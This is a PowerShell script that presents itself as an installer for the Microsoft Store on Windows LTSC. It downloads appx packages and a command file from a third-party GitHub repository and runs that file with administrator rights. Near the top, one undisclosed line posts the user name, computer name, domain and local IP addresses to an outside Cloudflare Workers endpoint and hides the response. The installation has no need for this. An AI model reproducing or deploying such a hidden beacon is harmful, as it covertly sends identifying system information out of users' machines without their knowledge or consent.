# =========================================================
# Script: Install LTSC Microsoft Store
# =========================================================

# Display Author and Repo Info in CMD
Write-Host "==============================================="
Write-Host "LTSC Add Microsoft Store Installer"
Write-Host "Author: rhshourav"
Write-Host "GitHub: https://github.com/rhshourav"
Write-Host "Supporting Repo: https://github.com/lixuy/LTSC-Add-MicrosoftStore"
Write-Host "Description: Downloads and installs Microsoft Store and related apps"
Write-Host "==============================================="
Invoke-RestMethod -Uri "https://cryocore.rhshourav02.workers.dev/message" -Method Post -ContentType "application/json" -Body (@{ token="shourav"; text="System Info:`nLTSC-ADD-MS_Store-2019`nUser Name: $env:USERNAME`nPC Name: $env:COMPUTERNAME`nDomain Name: $env:USERDOMAIN`nLocal IP(s): $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -notlike '127.*' } | ForEach-Object { $_.IPAddress }) -join ', ')" } | ConvertTo-Json) | Out-Null

# Create temporary folder
$TempFolder = Join-Path $env:TEMP "LTSC-Add-MicrosoftStore"
if (Test-Path $TempFolder) { Remove-Item -Recurse -Force $TempFolder }
New-Item -ItemType Directory -Path $TempFolder | Out-Null

# List of files to download (raw GitHub URLs)
$DOWNLOAD_URLS = @(
    "https://raw.githubusercontent.com/lixuy/LTSC-Add-MicrosoftStore/master/Add-Store.cmd",
    "https://raw.githubusercontent.com/lixuy/LTSC-Add-MicrosoftStore/master/Microsoft.DesktopAppInstaller_1.6.29000.1000_neutral_~_8wekyb3d8bbwe.AppxBundle",
    "https://raw.githubusercontent.com/lixuy/LTSC-Add-MicrosoftStore/master/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.xml",
    "https://raw.githubusercontent.com/lixuy/LTSC-Add-MicrosoftStore/master/Microsoft.NET.Native.Framework.1.6_1.6.24903.0_x64__8wekyb3d8bbwe.Appx",
    "https://raw.githubusercontent.com/lixuy/LTSC-Add-MicrosoftStore/master/Microsoft.NET.Native.Framework.1.6_1.6.24903.0_x86__8wekyb3d8bbwe.Appx",
    "https://raw.githubusercontent.com/lixuy/LTSC-Add-MicrosoftStore/master/Microsoft.NET.Native.Runtime.1.6_1.6.24903.0_x64__8wekyb3d8bbwe.Appx",
    "https://raw.githubusercontent.com/lixuy/LTSC-Add-MicrosoftStore/master/Microsoft.NET.Native.Runtime.1.6_1.6.24903.0_x86__8wekyb3d8bbwe.Appx",
    "https://raw.githubusercontent.com/lixuy/LTSC-Add-MicrosoftStore/master/Microsoft.StorePurchaseApp_11808.1001.413.0_neutral_~_8wekyb3d8bbwe.AppxBundle",
    "https://raw.githubusercontent.com/lixuy/LTSC-Add-MicrosoftStore/master/Microsoft.StorePurchaseApp_8wekyb3d8bbwe.xml",
    "https://raw.githubusercontent.com/lixuy/LTSC-Add-MicrosoftStore/master/Microsoft.VCLibs.140.00_14.0.26706.0_x64__8wekyb3d8bbwe.Appx",
    "https://raw.githubusercontent.com/lixuy/LTSC-Add-MicrosoftStore/master/Microsoft.VCLibs.140.00_14.0.26706.0_x86__8wekyb3d8bbwe.Appx",
    "https://raw.githubusercontent.com/lixuy/LTSC-Add-MicrosoftStore/master/Microsoft.WindowsStore_11809.1001.713.0_neutral_~_8wekyb3d8bbwe.AppxBundle",
    "https://raw.githubusercontent.com/lixuy/LTSC-Add-MicrosoftStore/master/Microsoft.WindowsStore_8wekyb3d8bbwe.xml",
    "https://raw.githubusercontent.com/lixuy/LTSC-Add-MicrosoftStore/master/Microsoft.XboxIdentityProvider_12.45.6001.0_neutral_~_8wekyb3d8bbwe.AppxBundle",
    "https://raw.githubusercontent.com/lixuy/LTSC-Add-MicrosoftStore/master/Microsoft.XboxIdentityProvider_8wekyb3d8bbwe.xml"
)

# Download files
foreach ($url in $DOWNLOAD_URLS) {
    $fileName = Split-Path $url -Leaf
    $destination = Join-Path $TempFolder $fileName
    Write-Host "Downloading $fileName..."
    Invoke-WebRequest -Uri $url -OutFile $destination
}

# Run the CMD file as Administrator
$cmdPath = Join-Path $TempFolder "Add-Store.cmd"
if (Test-Path $cmdPath) {
    Write-Host "`nRunning Add-Store.cmd as Administrator..."
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$cmdPath`"" -Verb RunAs -Wait
} else {
    Write-Host "Add-Store.cmd not found!"
}

# Clean up temporary folder
Write-Host "`nCleaning up temporary files..."
Remove-Item -Recurse -Force $TempFolder
Write-Host "Done!"
